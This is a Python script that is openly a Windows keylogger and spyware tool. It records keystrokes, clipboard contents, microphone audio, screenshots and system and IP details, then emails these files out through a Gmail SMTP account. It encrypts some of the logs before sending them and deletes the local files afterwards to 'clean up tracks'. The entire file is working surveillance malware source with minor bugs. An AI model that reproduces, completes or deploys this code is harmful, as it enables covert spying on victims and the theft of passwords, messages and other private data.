# Libraries
# Email
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# Information
import socket
import platform

# Clipboard
import win32clipboard

# KeyStrokes
from pynput.keyboard import Key, Listener

# OS Information
import time

# Microphone
from scipy.io.wavfile import write
import sounddevice as sd

# Cryptography
from cryptography.fernet import Fernet

# Getpass (username..)
import getpass
from requests import get

# Screenshot
from PIL import ImageGrab

# Default Variables
keysInformation = "keyLog.txt"
systemInformation = "systemInformation.txt"
clipboardInformation = "clipboard.txt"
audioInformation = "record.wav"
screenshotInformation = "screenshot.png"

# Change Encryption key
key = " "

keysInformationEncrypted = "keyLogE.txt"
systemInformationEncrypted = "systemInformationE.txt"
clipboardInformationEncrypted = "clipboardE.txt"

# Enter here the file path you want your files to be saved to
username = getpass.getuser()
filePath = ""
extend = "\\"
fileMerge = filePath + extend


# Variables to send an email with the keylogger file
# Enter here the sending mail address
emailAddress = "user@gmail.com"
password = "password"

# Enter here the receving mail address
toAddress = "user@gmail.com"

# Number of seconds to listen on the microphone
microphoneTime = 5

# Variables to define the duration of iterations
timeIteration = 15
numberOfIterationsEnd = 3


# Function to send an email with the keylogger file
def sendEmail(filename, attachment, toAddress):
    fromAddress = emailAddress

    message = MIMEMultipart()
    message['From'] = fromAddress
    message['To'] = toAddress
    message['Subject'] = "KeyLogger Log File"
    body = "Text in the body"
    message.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename = %s" % filename)
    message.attach(p)

    # To change in function of email address
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromAddress, password)

    text = message.as_string()
    s.sendmail(fromAddress, toAddress, text)
    s.quit()


# Function to get computer information such as Ip address, hostname, processor information....
def computerInformation():
    with open(fileMerge + systemInformation, "a") as file:
        hostname = socket.gethostname()
        IPAdress = socket.gethostbyname(hostname)
        try:
            publicIP = get("https://api.ipify.org").text
            file.write("Public ip adress: " + publicIP + '\n')
        except Exception:
            file.write("Could not get ip adress...")

        file.write("Processor: " + platform.processor() + '\n')
        file.write("System: " + platform.system() + " " + platform.version() + '\n')
        file.write("Machine: " + platform.machine() + '\n')
        file.write("Hostname: " + hostname + '\n')
        file.write("Private ip adress: " + IPAdress + '\n')


    computerInformation()


# Function to copy clipboard, only work if clipboard contains text
def copyClipboard():
    with open(fileMerge + clipboardInformation, "a") as file:
        try:
            win32clipboard.OpenClipboard()
            pastedData = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            file.write("Clipboard data: " + '\n' + pastedData + '\n')
        except:
            file.write("Clipboard could not be copied")


copyClipboard()

# Function to record microphone
def microphone():
    frequency = 44100
    seconds = microphoneTime

    myRecording = sd.rec(int(seconds * frequency), samplerate=frequency, channels=2)
    sd.wait()
    write(fileMerge + audioInformation, frequency, myRecording)

# Function used to take a screenshot
def screenshot():
    image = ImageGrab.grab()
    image.save(fileMerge + screenshotInformation)

# Variables for timer
numberOfIterations = 0
currentTime = time.time()
stoppingTime = currentTime + timeIteration

while numberOfIterations < numberOfIterationsEnd:

    # Variables to get keylogger
    count = 0
    keys = []


    # Functions to get keylogger
    def onPress(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            writeFile(keys)
            keys = []


    def writeFile(keys):
        with open(fileMerge + keysInformation, "a") as file:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    file.write('\n')
                    file.close()
                elif k.find("Key") == -1:
                    file.write(k)
                    file.close()


    def onRelease(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False


    with Listener(on_press=onPress, on_release=onRelease) as listener:
        listener.join()

    if currentTime > stoppingTime:
        with open(fileMerge + keysInformation, "w") as file:
            file.write(" ")

        screenshot()
        sendEmail(screenshotInformation, fileMerge + screenshotInformation, toAddress)

        microphone()
        sendEmail(audioInformation, fileMerge + audioInformation, toAddress)

        copyClipboard()

        numberOfIterations += 1

        currentTime: time.time()
        stoppingTime = currentTime + timeIteration

filesToEncrypt = [fileMerge+systemInformation,fileMerge+clipboardInformation,fileMerge+keysInformation]
encryptedFilesNames = [fileMerge+systemInformationEncrypted, fileMerge+clipboardInformationEncrypted,fileMerge+keysInformationEncrypted]

countFiles = 0
for files in filesToEncrypt:

    with open(filesToEncrypt[countFiles],'rb') as file:
        data = file.read()
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
    with open(encryptedFilesNames[countFiles], 'wb') as file:
        file.write(encrypted)

    sendEmail(encryptedFilesNames[countFiles], encryptedFilesNames[countFiles],toAddress)
    countFiles += 1


# Clean up tracks and delete text files
delete_files = [systemInformation, clipboardInformation, keysInformation, screenshotInformation, audioInformation]
for file in delete_files:
    os.remove(fileMerge + file)
exit()